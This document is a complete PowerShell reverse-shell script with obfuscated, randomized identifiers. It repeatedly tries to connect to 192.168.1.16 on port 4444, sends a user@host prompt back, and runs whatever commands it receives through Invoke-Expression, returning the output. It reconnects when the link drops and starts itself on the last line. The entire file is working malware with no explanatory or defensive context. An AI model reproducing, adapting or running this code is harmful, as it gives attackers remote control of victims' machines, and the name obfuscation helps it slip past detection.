class yVxHvbE {
    
    [string]$nuIPAwBcfAxzBQJJpL = "192.168.1.16"
    [int]$EsEYWOSMSsuAUri = 4444

    $ejuXmHrynoUYWINikm
    $hadhd
    $MLTvqiVKKARhbDGlfsHha
    $CdEnJdZqXuHumw
    $UcbqEQdnYBDjfCa
    $KAogBvCpShzL
    [int]$mMLrnvyiLyskDy = 50*1024

    HEZDN() {
        $this.hadhd = $false
        while ($true) {
            try {
                $this.hadhd = New-Object Net.Sockets.TcpClient($this.nuIPAwBcfAxzBQJJpL, $this.EsEYWOSMSsuAUri)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.xCNABvoOyQAyNdioYe()
    }

    xCNABvoOyQAyNdioYe() {
        $this.ejuXmHrynoUYWINikm = $this.hadhd.GetStream()
        $this.CdEnJdZqXuHumw = New-Object Byte[] $this.mMLrnvyiLyskDy
        $this.KAogBvCpShzL = New-Object Text.UTF8Encoding
        $this.MLTvqiVKKARhbDGlfsHha = New-Object IO.StreamWriter($this.ejuXmHrynoUYWINikm, [Text.Encoding]::UTF8, $this.mMLrnvyiLyskDy)
        $this.UcbqEQdnYBDjfCa = New-Object System.IO.StreamReader($this.ejuXmHrynoUYWINikm)
        $this.MLTvqiVKKARhbDGlfsHha.AutoFlush = $true
    }

    AHhGOBcjQzhpQ() {
        $this.HEZDN()
        $this.FmLspipyMVojEalfYh()
    }

    kAkVrCzLaClqqwyCrXhtVmL($fDdfMmOmFdEsFuyxIdQgwKo) {
        try {
            [byte[]]$QOhKApKYKVivwRN = [text.Encoding]::Ascii.GetBytes($fDdfMmOmFdEsFuyxIdQgwKo)
            $this.MLTvqiVKKARhbDGlfsHha.Write($QOhKApKYKVivwRN, 0, $QOhKApKYKVivwRN.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.AHhGOBcjQzhpQ()
        }
    }

    [string] PnVGn() {
        try {
            $ytAYdQ = $this.ejuXmHrynoUYWINikm.Read($this.CdEnJdZqXuHumw, 0, $this.mMLrnvyiLyskDy)    
            $oDcBbY = ($this.KAogBvCpShzL.GetString($this.CdEnJdZqXuHumw, 0, $ytAYdQ))
            return $oDcBbY
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.AHhGOBcjQzhpQ()
            return ""
        }
    }

    [string] EssAsMIExYYM($JfYpHWYCnLYjPBNEfBmbI) {
        Write-Host $JfYpHWYCnLYjPBNEfBmbI
        try { 
            $eMjTKJFgF = Invoke-Expression $JfYpHWYCnLYjPBNEfBmbI | Out-String
        }
        catch {
            $Ncotl = $_.Exception
            $CupWTVpyEwCxWKCsoamJcpTd = $_.Message
            $eMjTKJFgF = "`n$_`n"
        }
        return $eMjTKJFgF
    }

    [string] rhinta() {
        $spagmteoLukiRqLgkTlDy = [Environment]::UserName
        $PxSDQXhavTQTH = [System.Net.Dns]::GetHostName()
        $aAgaPNH = Get-Location
        return "$spagmteoLukiRqLgkTlDy@$PxSDQXhavTQTH [$aAgaPNH]~$ "
    }

    FmLspipyMVojEalfYh() {
        while ($this.hadhd.Connected) {
            $this.kAkVrCzLaClqqwyCrXhtVmL($this.rhinta())         
            $oDcBbY = $this.PnVGn()
            $eMjTKJFgF = "`n"
            if ([string]::IsNullOrEmpty($oDcBbY)) {
                continue
            }
            $eMjTKJFgF = $this.EssAsMIExYYM($oDcBbY)
            $this.kAkVrCzLaClqqwyCrXhtVmL($eMjTKJFgF + "`n")
            $this.ejuXmHrynoUYWINikm.Flush()
        }
        $this.hadhd.Close()
        $this.AHhGOBcjQzhpQ()
    } 
}

$kkRAfuYQTWzmq = [yVxHvbE]::new()
$kkRAfuYQTWzmq.AHhGOBcjQzhpQ()
